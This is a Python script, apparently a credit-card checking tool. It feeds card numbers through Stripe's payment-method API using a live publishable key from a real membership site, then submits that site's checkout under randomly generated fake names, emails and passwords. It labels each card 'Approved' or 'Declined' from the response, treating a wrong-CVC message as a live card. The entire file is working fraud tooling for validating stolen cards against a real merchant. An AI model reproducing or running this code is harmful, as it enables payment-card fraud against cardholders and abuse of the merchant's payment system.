import requests, random, re
from bs4 import BeautifulSoup
from rich import print
from faker import Faker

fake = Faker("es_AR")

def name():
    ns = fake.first_name()
    sk = fake.last_name()
    
    return ns, sk

def passf():
    password = fake.password(
    length=12,       # Longitud total
    special_chars=False,  # Incluir caracteres especiales
    digits=True,         # Incluir números
    upper_case=True,     # Incluir letras mayúsculas
    lower_case=True      # Incluir letras minúsculas
    )
    return password, fake.postcode()

def mail():
    dominios = ['hotmail.com', 'gmail.com', 'outlook.com', 'yahoo.com']
    nombre_usuario = fake.user_name().replace(" ", "").replace(".", "").replace("-", "").lower()
    dominio = random.choice(dominios)
    correo = f"{nombre_usuario}@{dominio}"
    return correo

def main3(si):
    ses = requests.Session()
    card = si
    car= card.replace("/", "|")
    num, mes, ano, cvv = car.strip().split("|")
    ano = ano[-2:]
    pswd, zip = passf()
    f_n, l_n = name()
    
    url1 = "https://api.stripe.com/v1/payment_methods"
    headers1 = {
  "Host": "api.stripe.com","Connection": "keep-alive","sec-ch-ua-platform": "\"Android\"","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","Accept": "application/json", "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"",  "Content-Type": "application/x-www-form-urlencoded", "sec-ch-ua-mobile": "?1", "Sec-GPC": "1", "Accept-Language": "es-MX,es;q=0.8", "Origin": "https://js.stripe.com", "Sec-Fetch-Site": "same-site",  "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty","Referer": "https://js.stripe.com/"
    }
    data1 = f"""type=card&billing_details[address][line1]=&billing_details[address][line2]=&billing_details[address][city]=&billing_details[address][state]=&billing_details[address][postal_code]={zip}&billing_details[address][country]=US&billing_details[name]={f_n}+{l_n}&card[number]={num}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fd16ff171ee%3B+stripe-js-v3%2Fd16ff171ee%3B+split-card-element&referrer=https%3A%2F%2Fvisegradinsight.eu&time_on_page=68486&key=pk_live_51HUqhxLeEmKrqQJR77B80B22wogbwGcRMmqAH3Y4ERXdmsKWFGJOJI9ycH1rIVBzH1ZGG5Zkfkjw7M3DdZtqGDAe00a9laqj2v"""
    res1 = requests.post(url1, headers=headers1, data=data1)
    pm = res1.json()["id"]
    last = res1.json()["card"]["last4"]
    
    url = "https://visegradinsight.eu/membership-account/membership-checkout/?level=5"
    headers = {
  "Host": "visegradinsight.eu","Connection": "keep-alive", "Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Windows\"","Origin": "https://visegradinsight.eu","Content-Type": "application/x-www-form-urlencoded","Upgrade-Insecure-Requests": "1",  "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "Sec-GPC": "1", "Accept-Language": "es-MX,es;q=0.8", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document","Referer": "https://visegradinsight.eu/membership-account/membership-checkout/?level=5",
   }
    data = f"""level=5&checkjavascript=1&other_discount_code=&discount_code=&username={passf()}&bfirstname={f_n}&blastname={l_n}&bemail={mail()}&password={pswd}&password2={pswd}&bconfirmemail_copy=1&fullname=&baddress1=&baddress2=&bcity=&bstate=&bphone=&vat_number=&bzipcode={zip}&bcountry=US&CardType=visa&submit-checkout=1&javascriptok=1&apbct_visible_fields=%7B%220%22%3A%7B%22visible_fields%22%3A%22other_discount_code+other_discount_code_button+discount_code+discount_code_button+username+bfirstname+blastname+bemail+password+password2+fullname+baddress1+baddress2+bcity+bstate+bphone+vat_number+bzipcode+bcountry%22%2C%22visible_fields_count%22%3A19%2C%22invisible_fields%22%3A%22level+checkjavascript+bconfirmemail_copy+CardType+submit-checkout+javascriptok%22%2C%22invisible_fields_count%22%3A6%7D%7D&payment_method_id={pm}&AccountNumber=XXXXXXXXXXXX{last}&ExpirationMonth={mes}&ExpirationYear=20{ano}"""
    res = requests.post(url, headers=headers, data=data)
    html = res.text
    soup = BeautifulSoup(res.text, "html.parser")
    if "Your card was declined." in html:
        return [si.strip(), "Declined", "Your card was declined."]
    elif "Your card's security code is incorrect" in res.text:
    	return [si.strip(), "Approved", "Your card's security code is incorrect"]
    elif "pmpro_message pmpro_error" in html:
        mensaje = soup.find("div", {"id": "pmpro_message_bottom", "class": "pmpro_message pmpro_error"})
        return [si.strip(), "Declined", mensaje.text.strip()]
    elif "pmpro_message pmpro_alert" in html:
        mensaje2 = soup.find("div", {"id": "pmpro_message_bottom", "class": "pmpro_message pmpro_alert"})
        return [si.strip(), "Declined", mensaje2.text.strip()]
    else:
        return [si, "Approved", "Approved"]
